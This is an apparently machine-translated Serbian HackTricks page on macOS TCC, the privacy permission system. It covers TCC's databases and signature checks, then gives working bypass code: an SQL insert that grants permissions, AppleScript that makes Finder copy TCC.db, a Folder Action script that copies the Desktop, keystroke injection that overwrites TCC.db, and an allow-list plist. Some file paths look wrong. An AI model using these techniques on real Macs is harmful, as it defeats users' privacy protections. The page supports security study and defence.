# macOS TCC

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Osnovne informacije**

**TCC (Transparentnost, Saglasnost i Kontrola)** je bezbednosni protokol koji se fokusira na regulisanje dozvola aplikacija. Njegova primarna uloga je da zaštiti osetljive funkcije kao što su **usluge lokacije, kontakti, fotografije, mikrofon, kamera, pristup pristupačnosti i punom disku**. Zahtevajući eksplicitnu saglasnost korisnika pre nego što odobri pristup aplikacijama ovim elementima, TCC poboljšava privatnost i kontrolu korisnika nad njihovim podacima.

Korisnici se susreću sa TCC kada aplikacije traže pristup zaštićenim funkcijama. Ovo je vidljivo kroz prozor koji omogućava korisnicima da **odobri ili odbije pristup**. Pored toga, TCC omogućava direktne korisničke akcije, kao što su **prevlačenje i ispuštanje datoteka u aplikaciju**, kako bi se odobrio pristup određenim datotekama, osiguravajući da aplikacije imaju pristup samo onome što je eksplicitno dozvoljeno.

![Primer TCC prozora](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** se upravlja putem **demon**-a koji se nalazi u `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` i konfiguriše u `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrujući mach servis `com.apple.tccd.system`).

Postoji **tccd u režimu korisnika** koji se pokreće za svakog prijavljenog korisnika definisanog u `/System/Library/LaunchAgents/com.apple.tccd.plist`, registrujući mach servise `com.apple.tccd` i `com.apple.usernotifications.delegate.com.apple.tccd`.

Ovde možete videti tccd koji se pokreće kao sistem i kao korisnik:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Permissions are **nasleđene od roditeljske** aplikacije i **dozvole** se **prate** na osnovu **Bundle ID** i **Developer ID**.

### TCC Baze Podataka

Dozvole/odbijanja se zatim čuvaju u nekim TCC bazama podataka:

* Sistem-wide baza podataka u **`/Library/Application Support/com.apple.TCC/TCC.db`**.
* Ova baza podataka je **SIP zaštićena**, tako da samo SIP zaobilaženje može da piše u nju.
* Korisnička TCC baza podataka **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** za podešavanja po korisniku.
* Ova baza podataka je zaštićena tako da samo procesi sa visokim TCC privilegijama kao što je Full Disk Access mogu da pišu u nju (ali nije zaštićena SIP-om).

{% hint style="warning" %}
Prethodne baze podataka su takođe **TCC zaštićene za pristup čitanju**. Tako da **nećete moći da pročitate** svoju redovnu korisničku TCC bazu podataka osim ako nije iz TCC privilegovanog procesa.

Međutim, zapamtite da će proces sa ovim visokim privilegijama (kao što su **FDA** ili **`kTCCServiceEndpointSecurityClient`**) moći da piše u korisničku TCC bazu podataka.
{% endhint %}

* Postoji **treća** TCC baza podataka u **`/var/db/locationd/clients.plist`** koja označava klijente kojima je dozvoljen **pristup uslugama lokacije**.
* SIP zaštićena datoteka **`/Users/carlospolop/Downloads/REG.db`** (takođe zaštićena od pristupa čitanju sa TCC), sadrži **lokaciju** svih **validnih TCC baza podataka**.
* SIP zaštićena datoteka **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (takođe zaštićena od pristupa čitanju sa TCC), sadrži više TCC dodeljenih dozvola.
* SIP zaštićena datoteka **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (može je pročitati svako) je lista dozvoljenih aplikacija koje zahtevaju TCC izuzetak.

{% hint style="success" %}
TCC baza podataka u **iOS** je u **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
**UI centra za obaveštenja** može da napravi **promene u sistemskoj TCC bazi podataka**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Međutim, korisnici mogu **izbrisati ili upititi pravila** pomoću **`tccutil`** komandne linijske alatke.
{% endhint %}

#### Upit baze podataka

{% tabs %}
{% tab title="korisnička DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="sistem DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Proverom obe baze podataka možete proveriti dozvole koje je aplikacija dozvolila, zabranila ili nema (tražiće ih).
{% endhint %}

* **`service`** je string reprezentacija TCC **dozvole**
* **`client`** je **bundle ID** ili **putanja do binarnog fajla** sa dozvolama
* **`client_type`** označava da li je to Bundle Identifier(0) ili apsolutna putanja(1)

<details>

<summary>Kako izvršiti ako je to apsolutna putanja</summary>

Jednostavno uradite **`launctl load you_bin.plist`**, sa plist-om kao:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** može imati različite vrednosti: denied(0), unknown(1), allowed(2) ili limited(3).
* **`auth_reason`** može imati sledeće vrednosti: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* Polje **csreq** je tu da označi kako da se verifikuje binarni fajl za izvršavanje i dodeljivanje TCC dozvola:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Za više informacija o **ostalim poljima** tabele [**proverite ovaj blog post**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Takođe možete proveriti **već date dozvole** aplikacijama u `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

{% hint style="success" %}
Korisnici _mogu_ **izbrisati ili upititi pravila** koristeći **`tccutil`**.
{% endhint %}

#### Resetovanje TCC dozvola
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Provere Potpisa

TCC **baza podataka** čuva **Bundle ID** aplikacije, ali takođe **čuva** **informacije** o **potpisu** kako bi se **osiguralo** da je aplikacija koja traži korišćenje dozvole ispravna. 

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Zato, druge aplikacije koje koriste isto ime i ID paketa neće moći da pristupe odobrenim dozvolama datim drugim aplikacijama.
{% endhint %}

### Ovlašćenja i TCC dozvole

Aplikacije **ne samo da treba** da **zatraže** i da im bude **odobren pristup** nekim resursima, već takođe treba da **imaju relevantna ovlašćenja**.\
Na primer, **Telegram** ima ovlašćenje `com.apple.security.device.camera` da zatraži **pristup kameri**. A **aplikacija** koja **nema** ovo **ovlašćenje neće moći** da pristupi kameri (i korisnik neće biti ni upitan za dozvole).

Međutim, da bi aplikacije **pristupile** **određenim korisničkim folderima**, kao što su `~/Desktop`, `~/Downloads` i `~/Documents`, **ne treba** da imaju nikakva specifična **ovlašćenja.** Sistem će transparentno upravljati pristupom i **pitanjem korisnika** po potrebi.

Apple-ove aplikacije **neće generisati upite**. Sadrže **pre-odobrene prava** u svom **spisku ovlašćenja**, što znači da **nikada neće generisati iskačući prozor**, **niti** će se pojaviti u bilo kojoj od **TCC baza podataka.** Na primer:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Ovo će sprečiti Kalendar da traži od korisnika pristup podsetnicima, kalendaru i adresaru.

{% hint style="success" %}
Osim neke zvanične dokumentacije o ovlašćenjima, takođe je moguće pronaći neoficijalne **zanimljive informacije o ovlašćenjima u** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Neke TCC dozvole su: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Ne postoji javna lista koja definiše sve njih, ali možete proveriti ovu [**listu poznatih**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Osetljiva nezaštićena mesta

* $HOME (sam)
* $HOME/.ssh, $HOME/.aws, itd.
* /tmp

### Korisnička namera / com.apple.macl

Kao što je ranije pomenuto, moguće je **dodeliti pristup aplikaciji do datoteke prevlačenjem i ispuštanjem**. Ovaj pristup neće biti naveden u nijednoj TCC bazi podataka, već kao **proširena** **atribut datoteke**. Ovaj atribut će **čuvati UUID** dozvoljene aplikacije:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Zanimljivo je da **`com.apple.macl`** atribut upravlja **Sandbox**, a ne tccd.

Takođe, imajte na umu da ako premestite datoteku koja omogućava UUID aplikacije na vašem računaru na drugi računar, zato što će ista aplikacija imati različite UID-ove, neće omogućiti pristup toj aplikaciji.
{% endhint %}

Prošireni atribut `com.apple.macl` **ne može biti obrisan** kao drugi prošireni atributi jer je **zaštićen SIP-om**. Međutim, kao što je [**objašnjeno u ovom postu**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), moguće je onemogućiti ga **kompresovanjem** datoteke, **brisanje** i **dekompresovanjem**.

## TCC Privesc & Bypasses

### Umetanje u TCC

Ako u nekom trenutku uspete da dobijete pristup za pisanje nad TCC bazom podataka, možete koristiti nešto poput sledećeg da dodate unos (uklonite komentare):

<details>

<summary>Primer umetanja u TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Ako ste uspeli da uđete u aplikaciju sa nekim TCC dozvolama, proverite sledeću stranicu sa TCC payload-ima da ih zloupotrebite:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Apple Events

Saznajte više o Apple događajima u:

{% content-ref url="macos-apple-events.md" %}
[macos-apple-events.md](macos-apple-events.md)
{% endcontent-ref %}

### Automatizacija (Finder) do FDA\*

TCC naziv dozvole za Automatizaciju je: **`kTCCServiceAppleEvents`**\
Ova specifična TCC dozvola takođe označava **aplikaciju koja može biti upravljana** unutar TCC baze podataka (tako da dozvole ne omogućavaju samo upravljanje svime).

**Finder** je aplikacija koja **uvek ima FDA** (čak i ako se ne pojavljuje u UI), tako da ako imate **Automatizaciju** privilegije nad njom, možete zloupotrebiti njene privilegije da **izvršite neke radnje**.\
U ovom slučaju vaša aplikacija bi trebala dozvolu **`kTCCServiceAppleEvents`** nad **`com.apple.Finder`**.

{% tabs %}
{% tab title="Steal users TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="Kradite sisteme TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Možete zloupotrebiti ovo da **napišete svoju vlastitu TCC bazu podataka korisnika**.

{% hint style="warning" %}
Sa ovom dozvolom moći ćete da **tražite od Findera da pristupi TCC ograničenim folderima** i da vam da datoteke, ali koliko ja znam, **nećete moći da naterate Finder da izvrši proizvoljan kod** kako biste u potpunosti zloupotrebili njegov FDA pristup.

Stoga, nećete moći da zloupotrebite sve FDA sposobnosti.
{% endhint %}

Ovo je TCC promp za dobijanje Automacija privilegija nad Finder-om:

<figure><img src="../../../../.gitbook/assets/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Imajte na umu da zato što aplikacija **Automator** ima TCC dozvolu **`kTCCServiceAppleEvents`**, može **kontrolisati bilo koju aplikaciju**, poput Findera. Dakle, imajući dozvolu da kontrolišete Automator, takođe biste mogli kontrolisati **Finder** sa kodom poput onog ispod:
{% endhint %}

<details>

<summary>Dobijte shell unutar Automator-a</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Isto se dešava sa **Script Editor aplikacijom,** može kontrolisati Finder, ali korišćenjem AppleScript-a ne možete je naterati da izvrši skriptu.

### Automatizacija (SE) do nekog TCC

**Sistemski događaji mogu kreirati akcije za foldere, a akcije za foldere mogu pristupiti nekim TCC folderima** (Desktop, Documents & Downloads), tako da se skripta poput sledeće može koristiti za zloupotrebu ovog ponašanja:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automatizacija (SE) + Pristupačnost (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** za FDA\*

Automatizacija na **`System Events`** + Pristupačnost (**`kTCCServicePostEvent`**) omogućava slanje **tastaturnih unosa procesima**. Na ovaj način možete zloupotrebiti Finder da promenite korisnikov TCC.db ili da dodelite FDA nekoj proizvoljnoj aplikaciji (iako bi možda bilo potrebno uneti lozinku za ovo).

Primer prepisivanja korisnikovog TCC.db putem Findera:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` za FDA\*

Proverite ovu stranicu za neke [**payloads za zloupotrebu dozvola pristupa**](macos-tcc-payloads.md#accessibility) za privesc do FDA\* ili pokretanje keylogger-a, na primer.

### **Endpoint Security Client za FDA**

Ako imate **`kTCCServiceEndpointSecurityClient`**, imate FDA. Kraj.

### Sistemska politika SysAdmin datoteka za FDA

**`kTCCServiceSystemPolicySysAdminFiles`** omogućava **promenu** **`NFSHomeDirectory`** atributa korisnika koji menja njegovu početnu fasciklu i stoga omogućava **obići TCC**.

### Korisnički TCC DB za FDA

Dobijanje **dozvola za pisanje** nad **korisničkom TCC** bazom podataka ne možete sebi dodeliti **`FDA`** dozvole, samo onaj koji živi u sistemskoj bazi podataka može to dodeliti.

Ali možete **možete** sebi dati **`Automatizacione dozvole za Finder`**, i zloupotrebiti prethodnu tehniku da se eskalirate do FDA\*.

### **FDA do TCC dozvola**

**Potpuni pristup disku** je TCC naziv **`kTCCServiceSystemPolicyAllFiles`**

Ne mislim da je ovo pravi privesc, ali samo u slučaju da to smatrate korisnim: Ako kontrolišete program sa FDA, možete **modifikovati korisničku TCC bazu podataka i dati sebi bilo koji pristup**. Ovo može biti korisno kao tehnika postojanosti u slučaju da izgubite svoje FDA dozvole.

### **SIP zaobilaženje do TCC zaobilaženja**

Sistemska **TCC baza podataka** je zaštićena **SIP-om**, zato samo procesi sa **navedenim privilegijama će moći da je modifikuju**. Stoga, ako napadač pronađe **SIP zaobilaženje** preko **datoteke** (da može da modifikuje datoteku koju ograničava SIP), moći će da:

* **Ukloni zaštitu** TCC baze podataka i da sebi dodeli sve TCC dozvole. Mogao bi zloupotrebiti bilo koju od ovih datoteka, na primer:
* TCC sistemska baza podataka
* REG.db
* MDMOverrides.plist

Međutim, postoji još jedna opcija za zloupotrebu ovog **SIP zaobilaženja da bi se zaobišao TCC**, datoteka `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` je lista dozvoljenih aplikacija koje zahtevaju TCC izuzetak. Stoga, ako napadač može **ukloniti SIP zaštitu** sa ove datoteke i dodati svoju **vlastitu aplikaciju**, aplikacija će moći da zaobiđe TCC.\
Na primer, da doda terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypasses

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## References

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
